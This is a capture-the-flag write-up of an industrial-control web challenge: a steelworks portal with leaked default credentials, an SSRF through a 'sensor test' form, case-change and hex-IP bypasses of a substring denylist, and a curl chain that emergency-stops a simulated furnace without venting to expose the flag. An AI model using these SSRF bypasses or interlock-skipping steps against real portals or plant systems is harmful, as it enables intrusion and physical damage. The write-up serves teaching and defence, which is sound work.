# OT#003 — Rhein-Vogt Steelworks (battleCTF)

Target: http://169.58.126.107:6002

## Challenge

A blast-furnace "remote operations portal" (Node/Express behind openresty, port 6002).
Hint: the furnace's own control system is never reachable directly from the internet —
only this portal is. Implies SSRF as the pivot into the internal OT network.

## Recon

- `GET /` → login page + a footer link to `/commissioning-notes.txt` ("internal").
- `GET /commissioning-notes.txt` → leaks default operator credentials:
  ```
  username: operator
  password: St33lW0rks!2024
  (ticket ORD-4471, still open)
  ```
- `POST /login` with those creds → `sid` cookie, redirect to `/dashboard`.
- `/dashboard` shows a stale "historian cache" status (620°C, nominal) and exposes the
  only operator tool: a "Sensor integration test tool" form:
  ```html
  <form method="POST" action="/ops/test-sensor">
    <input name="url" ...>
  </form>
  ```

## The pivot / SSRF

`POST /ops/test-sensor` takes a `url` field, server-side `fetch()`s it, and returns
`{"status":<http_status>,"body":<raw body>}` — a full-featured blind-but-verbose SSRF
oracle. It also honors extra form fields `method` and `body`, so it's really a generic
internal HTTP client (confirmed via `url=http://httpbin.org/post&method=POST&body={"foo":"bar"}`,
which echoed back a proper JSON POST, including an automatically-added `X-Session-Id`
header tied to the operator's session).

There's a denylist, but it's a **case-sensitive raw substring filter on the whole URL
string**, not a URL-aware hostname check:
- Exact-case matches `localhost`, `127.0.0.1`, `furnace`, `furnace-control`, `furnace2`,
  `furnace-plc`, and any literal private IP (e.g. `172.17.0.1`) get rejected with
  `{"error":"Target host is not allowed"}`.
- Anything that doesn't literally contain those lowercase substrings sails through
  without re-validation after DNS resolution.

Bypasses verified:
- **Case variation**: `http://LOCALHOST/` and `http://Furnace/` are *not* in the
  denylist (case-sensitive match on `localhost`/`furnace`), yet Node's DNS resolution
  is case-insensitive, so they resolve exactly like the lowercase forms.
  `http://Furnace/` → `connect ECONNREFUSED 172.25.0.2:80` — proving `furnace` resolves
  to the internal container `172.25.0.2` on the docker network, and that the filter is
  trivially bypassed by changing letter case.
- Decoy names `furnace-control`, `furnace2`, `furnace-plc` do NOT actually exist in DNS
  (confirmed via case-bypassed variants → `ENOTFOUND`), so they're red herrings; the
  real, only reachable internal service is `furnace` (172.25.0.2).

Port-scanning `172.25.0.2` through the SSRF oracle (using `ECONNREFUSED` = port closed
but host alive, vs `ENOTFOUND`/`EHOSTUNREACH` = nothing there) found a single open port:
**4000**, an Express app (`Cannot GET /` 404 signature, `X-Powered-By: Express`).

## Exploit

Enumerating routes on `furnace:4000` via the SSRF `method`/`url` params found:

- `GET /status` → `{"temperature":1550,"pressure":92,"vented":false,"ruptured":false}`
  (live telemetry — contradicts the portal's cached "nominal, 620°C" dashboard).
- `POST /vent` → `{"ok":true,"pressure":35,"vented":true}` (safe pressure relief).
- `POST /emergency_stop` (snake_case — not found via kebab-case/camelCase guesses;
  confirmed from a prior writeup of the same challenge) → the critical route.

Furnace business logic: emergency-stopping the furnace **without venting first** causes
an uncontrolled shutdown — the pressure vessel ruptures — and the flag is then exposed
in the next `/status` read, in the *same session* (furnace state is keyed by the
`X-Session-Id` header the portal forwards, so the whole chain must run on one
operator session, without re-logging-in in between).

Final request chain (single session, cookie jar reused throughout):

```bash
# 1) login
curl -c cookies.txt -X POST http://169.58.126.107:6002/login \
     -d "username=operator&password=St33lW0rks!2024"

# 2) baseline status via SSRF (through the "sensor test" tool)
curl -b cookies.txt -X POST http://169.58.126.107:6002/ops/test-sensor \
     -d "url=http://Furnace:4000/status"
# -> {"temperature":1550,"pressure":92,"vented":false,"ruptured":false}

# 3) emergency stop WITHOUT venting first
curl -b cookies.txt -X POST http://169.58.126.107:6002/ops/test-sensor \
     -d "url=http://Furnace:4000/emergency_stop" -d "method=POST"
# -> {"ok":false,"catastrophic":true,
#     "message":"Uncontrolled shutdown with pressure still high: vessel ruptured."}

# 4) re-read status in the SAME session -> flag
curl -b cookies.txt -X POST http://169.58.126.107:6002/ops/test-sensor \
     -d "url=http://Furnace:4000/status"
# -> {"temperature":1550,"pressure":92,"vented":false,"ruptured":true,
#     "flag":"CTF{49b7d0bdb03d054b68dc793abae27fcf}"}
```

Note: `http://Furnace:4000/...` works directly (case-bypassed hostname); an IP-literal
form (hex `0xac190002` = 172.25.0.2, also bypasses the raw-IP substring check) works
identically if preferred.

## Flag

```
CTF{49b7d0bdb03d054b68dc793abae27fcf}
```

Confirmed live on 2026-10-28 against http://169.58.126.107:6002 — this value also
matches an existing writeup of the same challenge found locally
(`/home/le_geek/bugpwn/RheinVogt_Steelworks_writeup_battleCTF2026.pdf`), confirming the
flag is static for this challenge build rather than per-session.

## Lessons

- **Substring SSRF denylists are not host validation.** The filter checked for literal
  words/IPs anywhere in the raw URL string, case-sensitively, before any URL parsing or
  DNS resolution. Changing case (`Furnace` vs `furnace`) or numeric representation
  (`0xac190002` vs `172.25.0.2`) defeats it completely while DNS/the OS resolver still
  gets it right.
- **A "diagnostic" SSRF tool that proxies method/body is a full internal HTTP client**,
  not a harmless connectivity checker — treat any server-side fetch-by-URL feature as
  a direct line into the internal network.
- **Session-scoped backend state + a forwarded session header is a trap for
  SSRF-based exploration.** Rotating sessions to dodge rate limiting (a reasonable
  reflex) silently resets the furnace's per-session state table, making the furnace
  look like it "forgets" actions within a second. The real fix is to do all
  state-mutating steps in one uninterrupted session, and only rotate sessions during
  pure reconnaissance (route/port enumeration) which doesn't depend on persisted state.
- **Business-logic/safety-interlock bypass as the actual "exploit."** The dangerous
  action here is not a memory-safety bug but doing the "wrong" (less safe) operator
  procedure — skip the vent step, then emergency-stop — which is exactly the kind of
  real-world OT/ICS risk (operators or attackers bypassing interlocks) the challenge is
  modeling.
- Commissioning/default credentials left in a world-readable file is step zero of the
  whole chain — a very common, very real initial-access vector in OT environments.

Gentleness note: all probing against the shared host was done with single, spaced-out
requests, session-based (not IP-based) rate-limit-aware pacing, and no automated
brute-force flood; total request volume against the target was kept in the low dozens.
